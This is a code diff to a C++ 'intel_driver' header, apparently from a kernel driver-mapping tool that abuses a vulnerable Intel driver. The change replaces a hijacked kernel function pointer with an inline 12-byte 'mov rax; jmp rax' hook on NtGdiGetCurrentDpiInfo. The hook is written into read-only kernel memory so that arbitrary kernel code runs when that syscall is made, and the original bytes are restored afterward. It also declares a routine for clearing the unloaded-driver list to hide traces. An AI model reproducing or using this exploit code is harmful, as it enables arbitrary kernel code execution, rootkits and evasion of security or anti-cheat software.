@@ -75,7 +75,7 @@ namespace intel_driver
 	uint64_t AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size);
 	bool FreePool(HANDLE device_handle, uint64_t address);
 	uint64_t GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name);
-	bool GetNtGdiDdDDIReclaimAllocations2KernelInfo(HANDLE device_handle, uint64_t* out_kernel_function_ptr, uint64_t* out_kernel_original_function_address);
+	bool GetNtGdiGetCurrentDpiInfoKernelInfo(HANDLE device_handle, uint64_t* out_kernel_function_ptr, BYTE* out_kernel_function_og_bytes);
 	bool ClearMmUnloadedDrivers(HANDLE device_handle);
 
 	template<typename T, typename ...A>
@@ -97,48 +97,43 @@ namespace intel_driver
 			return false;
 
 		// Setup function call 
+		LoadLibraryA("User32.dll");
+		const auto NtGdiGetCurrentDpiInfo = reinterpret_cast<void*>(GetProcAddress(LoadLibrary("gdi32full.dll"), "NtGdiGetCurrentDpiInfo"));
 
-		const auto NtGdiDdDDIReclaimAllocations2 = reinterpret_cast<void*>(GetProcAddress(LoadLibrary("gdi32full.dll"), "NtGdiDdDDIReclaimAllocations2"));
-
-		if (!NtGdiDdDDIReclaimAllocations2)
+		if (!NtGdiGetCurrentDpiInfo)
 		{
-			std::cout << "[-] Failed to get export gdi32full.NtGdiDdDDIReclaimAllocations2" << std::endl;
+			std::cout << "[-] Failed to get export gdi32full.NtGdiGetCurrentDpiInfo" << std::endl;
 			return false;
 		}
 
-		// Get function pointer (@win32kbase!gDxgkInterface table) used by NtGdiDdDDIReclaimAllocations2 and save the original address (dxgkrnl!DxgkReclaimAllocations2)
-
 		uint64_t kernel_function_ptr = 0;
-		uint64_t kernel_original_function_address = 0;
+		BYTE kernel_function_new_bytes[] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 };
+		BYTE kernel_function_og_bytes[12];
 
-		if (!GetNtGdiDdDDIReclaimAllocations2KernelInfo(device_handle, &kernel_function_ptr, &kernel_original_function_address))
+		memcpy(kernel_function_new_bytes + 2, &kernel_function_address, sizeof(kernel_function_address));
+
+		
+		if (!GetNtGdiGetCurrentDpiInfoKernelInfo(device_handle, &kernel_function_ptr, kernel_function_og_bytes))
 			return false;
 
-		// Overwrite the pointer with kernel_function_address
-
-		if (!WriteToReadOnlyMemory(device_handle, kernel_function_ptr, &kernel_function_address, sizeof(kernel_function_address)))
+		if (!WriteToReadOnlyMemory(device_handle, kernel_function_ptr, &kernel_function_new_bytes, sizeof(kernel_function_new_bytes)))
 			return false;
 
-		// Call function 
-
+		
 		if constexpr (!call_void)
 		{
-			using FunctionFn = T(__stdcall*)(A...);
-			const auto Function = static_cast<FunctionFn>(NtGdiDdDDIReclaimAllocations2);
 
-			*out_result = Function(arguments...);
+			const auto call = static_cast<T(__stdcall*)(A...)>(NtGdiGetCurrentDpiInfo);
+			*out_result = call(arguments...);
 		}
 		else
 		{
-			using FunctionFn = void(__stdcall*)(A...);
-			const auto Function = static_cast<FunctionFn>(NtGdiDdDDIReclaimAllocations2);
-
-			Function(arguments...);
+			const auto call = static_cast<void(__stdcall*)(A...)>(NtGdiGetCurrentDpiInfo);
+			call(arguments...);
 		}
 
-		// Restore the pointer
+		WriteToReadOnlyMemory(device_handle, kernel_function_ptr, &kernel_function_og_bytes, sizeof(kernel_function_og_bytes));
 
-		WriteToReadOnlyMemory(device_handle, kernel_function_ptr, &kernel_original_function_address, sizeof(kernel_original_function_address));
 		return true;
-	}
+	 }
 }
